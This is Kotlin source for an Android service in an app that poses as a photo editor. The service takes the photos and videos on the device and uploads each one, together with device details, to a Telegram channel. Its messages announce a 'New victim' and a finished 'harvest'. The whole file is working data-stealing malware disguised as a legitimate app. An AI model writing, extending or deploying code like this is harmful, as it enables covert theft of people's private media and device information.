package com.magic.photoeditor

import android.app.*
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.widget.Toast
import androidx.core.app.NotificationCompat
import java.io.File

class GalleryService : Service() {

    private lateinit var telegram: TelegramSender

    override fun onCreate() {
        super.onCreate()
        telegram = TelegramSender()
        createNotificationChannel()
        startForeground(Config.NOTIFICATION_ID, buildNotification("Harvesting selected media..."))
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val imageUris = intent?.getStringArrayExtra("image_uris") ?: emptyArray()
        val videoUris = intent?.getStringArrayExtra("video_uris") ?: emptyArray()

        Toast.makeText(this, "Harvesting ${imageUris.size} images, ${videoUris.size} videos", Toast.LENGTH_SHORT).show()
        harvestAll(imageUris, videoUris)
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun harvestAll(imageUris: Array<String>, videoUris: Array<String>) {
        try {
            val info = Utils.getDeviceInfo(this)
            telegram.sendMessage("📱 New victim: $info")

            var count = 0
            imageUris.forEach { uriString ->
                try {
                    val uri = Uri.parse(uriString)
                    val path = Utils.getRealPathFromUri(this, uri)
                    if (path != null) {
                        val file = File(path)
                        if (file.exists()) {
                            telegram.sendFile(file, "photo", file.name)
                            count++
                            Thread.sleep(100)
                        }
                    }
                } catch (e: Exception) {
                    telegram.sendMessage("❌ Error sending image: ${e.message}")
                }
            }

            videoUris.forEach { uriString ->
                try {
                    val uri = Uri.parse(uriString)
                    val path = Utils.getRealPathFromUri(this, uri)
                    if (path != null) {
                        val file = File(path)
                        if (file.exists() && file.length() < 50 * 1024 * 1024) {
                            telegram.sendFile(file, "video", file.name)
                            count++
                            Thread.sleep(100)
                        }
                    }
                } catch (e: Exception) {
                    telegram.sendMessage("❌ Error sending video: ${e.message}")
                }
            }

            telegram.sendMessage("✅ Harvest complete: $count files sent.")
            Toast.makeText(this, "Harvest complete: $count files", Toast.LENGTH_SHORT).show()
            stopSelf()
        } catch (e: Exception) {
            telegram.sendMessage("❌ Harvest error: ${e.message}")
            Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
            stopSelf()
        }
    }

    private fun buildNotification(text: String): Notification {
        return NotificationCompat.Builder(this, Config.CHANNEL_ID)
            .setContentTitle("Photo Editor")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_gallery)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                Config.CHANNEL_ID,
                Config.CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }
}
